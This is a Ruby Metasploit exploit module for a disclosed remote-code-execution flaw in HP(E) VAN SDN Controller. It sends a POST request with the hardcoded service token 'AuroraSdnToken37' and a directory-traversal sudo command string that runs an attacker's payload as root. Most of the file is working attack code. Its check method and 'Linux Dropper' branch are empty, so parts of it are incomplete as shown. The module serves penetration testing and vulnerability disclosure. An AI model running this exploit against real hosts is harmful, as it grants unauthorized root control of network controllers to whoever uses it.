##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'HP VAN SDN Controller Hardcoded Service Token RCE',
      'Description'    => %q{
        This module exploits a hardcoded service token and weak sudo permissions
        in HP(E) VAN SDN Controller <= 2.7.18.0503 to execute commands as root.
      },
      'Author'         => [
        'Matt Bergin', # Vulnerability discovery
        'wvu'          # Metasploit module
      ],
      'References'     => [
        ['EDB', '44951'],
        ['URL', 'https://korelogic.com/Resources/Advisories/KL-001-2018-008.txt']
      ],
      'DisclosureDate' => 'Jun 25 2018',
      'License'        => MSF_LICENSE,
      'Platform'       => ['unix', 'linux'],
      'Arch'           => [ARCH_CMD, ARCH_X86, ARCH_X64],
      'Privileged'     => true,
      'Targets'        => [
        ['Unix In-Memory',
         'Platform'    => 'unix',
         'Arch'        => ARCH_CMD,
         'Type'        => :unix_memory
        ],
        ['Linux Dropper',
         'Platform'    => 'linux',
         'Arch'        => [ARCH_X86, ARCH_X64],
         'Type'        => :linux_dropper
        ]
      ],
      'DefaultTarget'  => 0,
      'DefaultOptions' => {'RPORT' => 8081, 'SSL' => true}
    ))
  end

  def check
  end

  def exploit
    case target['Type']
    when :unix_memory
      execute_command(payload.encoded)
    when :linux_dropper
    end
  end

  def execute_command(cmd, opts = {})
    # Directory traversal for direct root command execution
    privesc = "../../../../../usr/bin/sudo -u sdn sudo #{cmd}"

    send_request_cgi(
      'method'  => 'POST',
      'uri'     => '/',
      'headers' => {'X-Auth-Token' => 'AuroraSdnToken37'},
      'data'    => %Q({"action": "exec", "name": "#{privesc}"})
    )
  end

end
